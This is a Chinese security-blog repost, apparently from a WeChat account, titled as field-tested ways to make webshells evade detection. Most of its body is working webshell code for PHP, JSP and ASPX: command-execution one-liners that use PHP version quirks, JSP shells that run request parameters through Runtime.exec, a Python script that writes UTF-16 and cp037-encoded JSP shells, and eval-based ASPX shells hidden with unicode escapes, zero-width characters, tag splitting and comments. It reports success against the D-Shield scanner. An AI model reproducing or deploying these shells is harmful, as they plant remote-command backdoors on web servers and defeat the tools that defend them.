#  几种实战成功过的webshell免杀方式

[ LemonSec ](javascript:void\(0\);)

**LemonSec** ![]()

微信号 lemon-sec

功能介绍 每日发布安全资讯～

____

__

收录于话题

文章来源：先知社区（Icepaper）

原文地址：https://xz.aliyun.com/t/10937

  

 **0x01 php的免杀**

传统的php免杀不用多说了，无非就是各种变形和外部参数获取，对于一些先进的waf和防火墙来说，不论如何解析最终都会到达命令执行的地方，但是如果语法报错的话，就可能导致解析失败了，这里简单说几个利用php版本来进行语义出错的php命令执行方式。  

  

###  **1、利用在高版本php语法不换行来执行命令**

  *   *   *   *   * 

    
    
     <?=$a=<<< aaassasssasssasssasssasssasssasssasssasssasssassssaa;echo `whoami`?>

  

####  **5.2 版本报错**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212743.png)  
 **5.3
版本报错**![](https://gitee.com/fuli009/images/raw/master/public/20220416212758.png)  

####  **5.4 版本报错**

![]()  

####  **7.3.4 成功执行命令**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212800.png)

  

###  **2、利用\特殊符号来引起报错**

  *   * 

    
    
     <?php\echo `whoami`;?>

  

####  **5.3 执行命令失败**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212801.png)

  

####  **7.3 执行命令失败**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212802.png)  

####  **5.2 成功执行**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212803.png)

  

##  **3、十六进制字符串**

在php7中不认为是数字，php5则依旧为数字，经过测试 5.3 和5.5可以成功执行命令，5.2和php7无法执行。

  *   *   *   * 

    
    
    <?php$s=substr("aabbccsystem","0x6");$s(whoami)?>

  

####  **7.3 命令执行失败**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212805.png)  

####  **5.2 命令执行失败**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212806.png)  

###  **5.3 命令执行成功**

![](https://gitee.com/fuli009/images/raw/master/public/20220416212807.png)  
除此之外，还有很多种利用版本差异性来bypass一些没有对所有版本进行检测更新的所谓的"先进waf"。  
当然，对于我们可以结合垃圾数据，变形混淆，以及大量特殊字符和注释的方式来构造更多的payload,毕竟每家的waf规则不同，配置也不同，与一些传输层面的bypass进行结合产生的可能性就会非常多样。  
 **例如：**

7.0版本的??特性，如果版本为5.x的话就会报错，可以结合一些其他的方式吧

  *   *   *   * 

    
    
    <?php$a = $_GET['function'] ?? 'whoami';$b = $_GET['cmd'] ?? 'whoami';$a(null.(null.$b));

  

 **0x02 jsp的免杀**

本人对java研究的不是非常深入，因此主要分享的还是平时收集的几个小tips，如果有没看过的师傅现在看到了也是极好的，java
unicode绕过就不再多言。  

  

####  **0、小小Tips**

jsp的后缀可以兼容为jspx的代码，也兼容jspx的所有特性，如CDATA特性。  
jspx的后缀不兼容为jsp的代码，jspx只能用jspx的格式。

  

####  **1、jspx CDATA特性**

在XML元素里，<和&是非法的，遇到<解析器会把该字符解释为新元素的开始，遇到&解析器会把该字符解释为字符实体化编码的开始。

  

但是我们有时候有需要在jspx里添加js代码用到大量的<和&字符，因此可以将脚本代码定义为CDATA。

  

CDATA部分内容会被解析器忽略，此时ameter依旧会与getPar拼接成为getParameter。

  *   * 

    
    
    格式：<![CDATA[xxxxxxxxxxxxxxxxxxx]]>例如：String cmd = request.getPar<![CDATA[ameter]]>("shell");

  

####  **2、实体化编码**

  *   *   * 

    
    
     if (cmd !=null){        Process child = Runtime.getRuntime().exec(cmd);        InputStream in = child.getInputStream();

  

####  **3、利用java支持其他编码格式来进行绕过**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     #python2charset = "utf-8"data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)  
    f16be = open('utf-16be.jsp','wb')f16be.write('<%@ page contentType="charset=utf-16be" %>')f16be.write(data.encode('utf-16be'))  
      
    f16le = open('utf-16le.jsp','wb')f16le.write('<jsp:directive.page contentType="charset=utf-16le"/>')f16le.write(data.encode('utf-16le'))  
    fcp037 = open('cp037.jsp','wb')fcp037.write(data.encode('cp037'))fcp037.write('<%@ page contentType="charset=cp037"/>')

![](https://gitee.com/fuli009/images/raw/master/public/20220416212808.png)

  

可以看到对于D盾的免杀效果还是非常好的。

![]()

  

 **0x03 aspx的免杀**

aspx免杀的方式相对于PHP和java的较少，这里列出5种方式来bypass进行免杀  

  *   *   *   *   *   * 

    
    
    unicode编码空字符串连接<%%>截断头部替换特殊符号@注释

  
我们以一个普通的冰蝎马作为示例

  * 

    
    
    <%@ Page Language="Jscript"%>eval(@Request.Item["pass"],"unsafe");%

  

这一步无需多言，一定是会被D盾所查杀的

![](https://gitee.com/fuli009/images/raw/master/public/20220416212809.png)  

####  **1、unicode编码**

例如eval他可以变为\u0065\u0076\u0061\u006c，经过我本地的测试，它不支持大U和多个0的增加

  * 

    
    
    <%@ Page Language="Jscript"%><%\u0065\u0076\u0061\u006c(@Request.Item["pass"],"unsafe");%>

  

####  **2、空字符串连接**

在函数字符串中插入这些字符都不会影响脚本的正常运行，在测试前需要注意该类字符插入的位置，否则插入错误的地方会产生报错

  *   *   *   * 

    
    
    \u200c\u200d\u200e\u200f

  

####  **3、使用 <%%>语法**

将整个字符串与函数利用<%%>进行分割

  * 

    
    
    <%@page Language=JS%><%eval%><%(Request.%><%Item["pass"],"unsafe");%>

  

####  **4、头部免杀**

之前有遇到过检测该字段的<%@ Page Language="C#"
%>，这个是标识ASPX的一个字段，针对该字段进行免杀%@Language=CSHARP%，很久之前修改为这样就过了，同样的，可以修改为

  * 

    
    
    <%@ Page Language="Jscript"%>------》<%@Page Language=JS%>

  

也可以将该字段放在后面，不一定要放前面等

  

####  **5、使用符号**

如哥斯拉webshell存在特征代码，可以添加@符号但是不会影响其解析。

  *   * 

    
    
    (Context.Session["payload"] == null)(@Context.@Session["payload"] == null)

![](https://gitee.com/fuli009/images/raw/master/public/20220416212810.png)![](https://gitee.com/fuli009/images/raw/master/public/20220416212812.png)

  

####  **6、注释可以随意插入**

如下所示为冰蝎部分代码，可以与<%%>结合使用效果会更好。

  * 

    
    
    <%/*qi*/Session./*qi*/Add(@"k"/*qi*/,/*qi*/"e45e329feb5d925b"/*qi*/)

  

![](https://gitee.com/fuli009/images/raw/master/public/20220416212813.png)  

![](https://gitee.com/fuli009/images/raw/master/public/20220416212814.png)

[蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  

[通过DNSLOG回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  

[记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  

[内网渗透初探 |
小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  

[实战|通过恶意 pdf 执行 xss
漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  

[免杀技术有一套（免杀方法大集结）(Anti-
AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  

[内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  

[关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  

[任意账号密码重置的6种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  

[干货 |
横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  

[手把手教你Linux提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)  

  

* * *

 ** **欢迎关注LemonSec****

 **觉得不错点个 **“赞”** 、“在看”哦**

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

